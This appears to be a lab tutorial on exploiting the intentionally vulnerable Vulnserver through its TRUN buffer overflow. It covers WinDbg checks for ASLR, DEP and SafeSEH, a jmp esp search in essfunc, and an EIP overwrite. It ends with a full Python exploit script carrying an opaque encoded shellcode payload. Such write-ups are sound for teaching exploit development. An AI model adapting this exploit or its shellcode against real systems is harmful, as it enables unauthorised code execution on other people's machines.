# :game_die: Mastering Buffer Overflows with Vulnserver

---

## Find the Right Module

Before we can identify the correct return address, we need to ensure that `vulnserver.exe` doesn't have any protections in place. To do this, use the following command to retrieve the base address:

```
lm m vulnserver
```

From the image above, we can see that the base address is `00400000`. Next, we dump the `IMAGE_DOS_HEADER` and find that the `e_lfanew` field contains the offset to the PE header, which is `0x80`.

Next, dump the `IMAGE_NT_HEADERS` structure to gather further details.

We also need to check the `DllCharacteristics` in the `_IMAGE_OPTIONAL_HEADER` to ensure there are no security protections in place.

Finally, we found that the value is `0`, meaning the `vulnserver` doesn’t have any protections enabled, such as SafeSEH, ASLR, or DEP. However, the base address of the `vulnserver` lies between `00400000` and `00407000`. This range always starts with `00`, and unfortunately, `\x00` is a bad character.

Since the `vulnserver` base address contains bad characters (`\x00`), we need to look for other DLLs that `vulnserver` calls, specifically those with addresses that don't contain bad characters.

Here are some of the modules that `vulnserver` calls:

We can use the command `!dh <module_name>` to dump all the data and check which module has `DllCharacteristics` set to `0`. For example, one of the modules we can check is `essfunc`.

Next, we need to search for the address of `jmp esp` within the `essfunc` module. Since the `jmp esp` instruction is represented by `FFE4` in assembly, we’ll search for this value within the module.

Using the start and end addresses of the `essfunc` module, we can now search for `FF E4`, which corresponds to the `jmp esp` instruction in assembly.:

```
s -b 0x62500000 L?0x62508000 ff e4
```

After searching, we found the address `625011af`, which does not contain any bad characters.

When placing the address into the `EIP`, we must enter it in reverse order, like this:

```
eip_overwrite = "\xaf\x11\x50\x62"
```

This is the final python script:

```
import socket, time, sys

ip = "192.168.0.105"
port = 9999
timeout = 5
prefix = "TRUN ."
buffer = "A"*2006
eip_overwrite = "\xaf\x11\x50\x62"
nops = "\x90" * 10
buf = ""
buf += "\xbe\x1f\x83\x86\xe7\xd9\xcc\xd9\x74\x24\xf4\x5f"
buf += "\x31\xc9\xb1\x52\x83\xef\xfc\x31\x77\x0e\x03\x68"
buf += "\x8d\x64\x12\x6a\x79\xea\xdd\x92\x7a\x8b\x54\x77"
buf += "\x4b\x8b\x03\xfc\xfc\x3b\x47\x50\xf1\xb0\x05\x40"
buf += "\x82\xb5\x81\x67\x23\x73\xf4\x46\xb4\x28\xc4\xc9"
buf += "\x36\x33\x19\x29\x06\xfc\x6c\x28\x4f\xe1\x9d\x78"
buf += "\x18\x6d\x33\x6c\x2d\x3b\x88\x07\x7d\xad\x88\xf4"
buf += "\x36\xcc\xb9\xab\x4d\x97\x19\x4a\x81\xa3\x13\x54"
buf += "\xc6\x8e\xea\xef\x3c\x64\xed\x39\x0d\x85\x42\x04"
buf += "\xa1\x74\x9a\x41\x06\x67\xe9\xbb\x74\x1a\xea\x78"
buf += "\x06\xc0\x7f\x9a\xa0\x83\xd8\x46\x50\x47\xbe\x0d"
buf += "\x5e\x2c\xb4\x49\x43\xb3\x19\xe2\x7f\x38\x9c\x24"
buf += "\xf6\x7a\xbb\xe0\x52\xd8\xa2\xb1\x3e\x8f\xdb\xa1"
buf += "\xe0\x70\x7e\xaa\x0d\x64\xf3\xf1\x59\x49\x3e\x09"
buf += "\x9a\xc5\x49\x7a\xa8\x4a\xe2\x14\x80\x03\x2c\xe3"
buf += "\xe7\x39\x88\x7b\x16\xc2\xe9\x52\xdd\x96\xb9\xcc"
buf += "\xf4\x96\x51\x0c\xf8\x42\xf5\x5c\x56\x3d\xb6\x0c"
buf += "\x16\xed\x5e\x46\x99\xd2\x7f\x69\x73\x7b\x15\x90"
buf += "\x14\x44\x42\x9a\x8e\x2c\x91\x9a\x4f\x16\x1c\x7c"
buf += "\x25\x78\x49\xd7\xd2\xe1\xd0\xa3\x43\xed\xce\xce"
buf += "\x44\x65\xfd\x2f\x0a\x8e\x88\x23\xfb\x7e\xc7\x19"
buf += "\xaa\x81\xfd\x35\x30\x13\x9a\xc5\x3f\x08\x35\x92"
buf += "\x68\xfe\x4c\x76\x85\x59\xe7\x64\x54\x3f\xc0\x2c"
buf += "\x83\xfc\xcf\xad\x46\xb8\xeb\xbd\x9e\x41\xb0\xe9"
buf += "\x4e\x14\x6e\x47\x29\xce\xc0\x31\xe3\xbd\x8a\xd5"
buf += "\x72\x8e\x0c\xa3\x7a\xdb\xfa\x4b\xca\xb2\xba\x74"
buf += "\xe3\x52\x4b\x0d\x19\xc3\xb4\xc4\x99\xf3\xfe\x44"
buf += "\x8b\x9b\xa6\x1d\x89\xc1\x58\xc8\xce\xff\xda\xf8"
buf += "\xae\xfb\xc3\x89\xab\x40\x44\x62\xc6\xd9\x21\x84"
buf += "\x75\xd9\x63"
string = prefix + buffer + eip_overwrite + nops + buf
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.settimeout(timeout)
s.connect((ip, port))
s.recv(1024)
print(f"Fuzzing with {format(len(string) - len(prefix))} bytes")
s.send(bytes(string, "latin-1"))
s.recv(1024)

except:
print(f"Fuzzing crashed at {format(len(string) - len(prefix))}")
sys.exit(0)
```

---
